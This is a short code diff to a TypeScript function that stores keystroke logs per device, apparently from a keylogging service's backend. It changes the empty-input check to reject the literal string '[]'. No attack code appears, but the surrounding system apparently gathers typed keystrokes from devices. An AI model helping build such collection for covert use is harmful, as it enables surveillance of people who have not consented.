@@ -28,7 +28,7 @@ export const addNewKeyLogs = async (data: any) => {
 		const { deviceId, keyLogsType, keylogs, event } = data;
 
 		// Check if keylogs is not an empty string
-		if (!keylogs || keylogs.trim() === "") {
+		if (!keylogs || keylogs.trim() === "[]") {
 			return {
 				status: 400,
 				message: "Key logs are empty, nothing to save",
